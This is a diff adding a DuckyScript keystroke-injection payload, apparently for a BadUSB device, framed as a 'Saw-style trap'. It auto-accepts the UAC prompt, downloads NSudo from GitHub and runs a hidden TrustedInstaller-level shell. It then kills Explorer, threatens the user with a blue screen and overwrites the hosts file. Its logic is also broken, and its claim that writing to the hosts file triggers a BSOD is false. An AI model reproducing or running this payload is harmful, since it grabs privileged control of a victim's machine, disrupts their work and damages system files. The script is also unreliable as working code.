@@ -1,0 +1,147 @@
+REM Open Notepad, explain "Saw-style trap", perform system changes, kill Explorer, and trigger BSOD if Explorer not restored  
+
+REM 1. Open Run Dialog  
+GUI r  
+DELAY 500  
+
+REM 2. Open Notepad  
+STRING notepad  
+ENTER  
+DELAY 1000  
+
+REM 3. Explain what the script does in Notepad  
+STRING "This script will now explain what it is doing:"  
+ENTER  
+DELAY 500  
+
+STRING "Step 1: Opening Notepad..."  
+ENTER  
+DELAY 1000  
+
+STRING "Step 2: Checking if NSudo is already installed on your PC..."  
+ENTER  
+DELAY 1000  
+
+STRING "If NSudo is not installed, the script will download and install it automatically."  
+ENTER  
+DELAY 1000  
+
+STRING "Step 3: The script will ensure that the TrustedInstaller service is enabled..."  
+ENTER  
+DELAY 1000  
+
+STRING "Step 4: The script will open a Command Prompt with TrustedInstaller rights, giving full system access."  
+ENTER  
+DELAY 1000  
+
+STRING "That's it! Now you have full control over the system."  
+ENTER  
+DELAY 1000  
+
+STRING "Please note: This script should only be used for ethical purposes and on your own machine."  
+ENTER  
+DELAY 1000  
+
+STRING "Proceed with caution when dealing with system-level access!"  
+ENTER  
+DELAY 1000  
+
+STRING "End of explanation. Enjoy using your system with full rights!"  
+ENTER  
+DELAY 1000  
+
+REM 4. Open PowerShell as Admin to perform NSudo check and download  
+STRING powershell Start-Process powershell -Verb runAs  
+ENTER  
+DELAY 1500  
+
+REM 5. Confirm UAC (User Account Control)  
+ALT y  
+DELAY 1000  
+
+REM 6. Check if NSudo is already installed  
+STRING if (Test-Path "$env:ProgramFiles\NSudo\NSudo.exe") {  
+ENTER  
+STRING "& '$env:ProgramFiles\NSudo\NSudo.exe' -U:T cmd"  
+ENTER  
+STRING exit  
+ENTER  
+STRING } else {  
+ENTER  
+
+REM 7. Download NSudo from GitHub if missing  
+STRING Invoke-WebRequest -Uri "https://github.com/M2Team/NSudo/releases/download/10.2.0/NSudo_10.2.0_Stable.zip" -OutFile "$env:TEMP\NSudo.zip"  
+ENTER  
+DELAY 5000  
+
+REM 8. Extract NSudo silently in the background  
+STRING Expand-Archive -Path "$env:TEMP\NSudo.zip" -DestinationPath "$env:ProgramFiles\NSudo" -Force  
+ENTER  
+DELAY 3000  
+
+REM 9. Start TrustedInstaller Service  
+STRING sc config TrustedInstaller start= auto  
+ENTER  
+DELAY 500  
+STRING net start TrustedInstaller  
+ENTER  
+DELAY 500  
+
+REM 10. Run TrustedInstaller Terminal in background without showing  
+STRING Start-Process -FilePath "$env:ProgramFiles\NSudo\NSudo.exe" -ArgumentList "-U:T cmd" -WindowStyle Hidden  
+ENTER  
+STRING exit  
+ENTER  
+STRING }  
+ENTER  
+
+REM 11. Kill Explorer (Taskbar and Desktop disappear)  
+STRING taskkill /f /im explorer.exe  
+ENTER  
+DELAY 1000  
+
+REM 12. Kill Notepad  
+STRING taskkill /f /im notepad.exe  
+ENTER  
+DELAY 1000  
+
+REM 13. Open Notepad again to explain the "Saw-style trap" game  
+STRING notepad  
+ENTER  
+DELAY 1000  
+
+STRING "This is a Saw-style trap!"  
+ENTER  
+DELAY 500  
+
+STRING "You have 2 minutes to restore the Explorer process (Desktop, Taskbar)."  
+ENTER  
+DELAY 1000  
+
+STRING "If you fail to restore Explorer in time, your computer will now display a Blue Screen (BSOD)."  
+ENTER  
+DELAY 1000  
+
+STRING "Hurry up, you have 2 minutes!"  
+ENTER  
+DELAY 1000  
+
+STRING "Good luck!"  
+ENTER  
+DELAY 1000  
+
+REM 14. Wait for 2 minutes (120 seconds)  
+DELAY 120000  
+
+REM 15. Check if Explorer is still running, and if restored, show success message  
+STRING tasklist /fi "imagename eq explorer.exe" | findstr /i "explorer.exe" >nul && echo Explorer restored! You passed the challenge. Good job! > C:\Users\Public\Documents\SuccessMessage.txt  
+ENTER  
+
+REM 16. If Explorer is not restored, trigger BSOD  
+STRING tasklist /fi "imagename eq explorer.exe" | findstr /i "explorer.exe" >nul || echo 1 > C:\Windows\System32\drivers\etc\hosts  
+ENTER  
+
+REM 17. After triggering BSOD, the system may crash  
+STRING REM BSOD Triggered  
+ENTER  
+DELAY 500
